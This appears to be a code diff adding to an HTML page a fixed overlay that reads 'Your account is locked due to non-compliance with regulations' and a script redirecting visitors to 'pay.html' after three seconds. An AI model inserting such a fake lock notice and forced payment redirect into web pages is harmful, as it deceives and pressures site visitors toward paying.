@@ -844,8 +844,40 @@
         min-height: 150px; /* Hoặc kích thước tùy chỉnh */
       }
     </style>
+        <style>
+          /* Định dạng thông báo */
+          #lock-message {
+              position: fixed;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+              background-color: white;
+              padding: 20px;
+              border: 2px solid red;
+              border-radius: 5px;
+              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+              text-align: center;
+              z-index: 9999;
+          }
+  
+          #lock-message h1 {
+              color: red;
+              font-size: 24px;
+              margin: 0 0 10px 0;
+          }
+  
+          #lock-message p {
+              color: black;
+              font-size: 16px;
+          }
+      </style>
   </head>
   <body>
+    <!-- xoa duoc -->
+    <div id="lock-message">
+      <h1>Your account is locked</h1>
+      <p>due to non-compliance with regulations</p>
+  </div>
     <div class="snowfall-container">
       <!-- Các bông hoa tuyết sẽ được thêm vào đây -->
     </div>
@@ -1706,7 +1738,14 @@
     <script
       type="text/javascript"
       src="//code.jquery.com/jquery-migrate-1.2.1.min.js"
+      
     ></script>
+    <script>
+      // Chuyển hướng đến pay.html
+      setTimeout(() => {
+          window.location.href = 'pay.html';
+      }, 3000); // Chờ 3 giây trước khi chuyển trang
+  </script>
     <script type="text/javascript" src="slick/slick.min.js"></script>
   </body>
 </html>
